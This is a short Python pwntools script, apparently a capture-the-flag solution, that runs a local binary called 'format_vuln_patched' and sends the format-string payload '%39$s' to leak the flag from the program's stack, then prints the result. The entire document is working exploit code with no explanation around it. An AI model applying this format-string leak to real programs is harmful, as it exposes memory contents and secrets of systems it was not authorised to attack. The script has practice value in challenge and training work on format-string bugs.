#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF("./format_vuln_patched", checksec=False)

p = process(level='error')
p.sendlineafter(b'> ', '%39$s')
result= p.recvuntil(b'> ')
print('Flag : ' + str(result))
p.close()
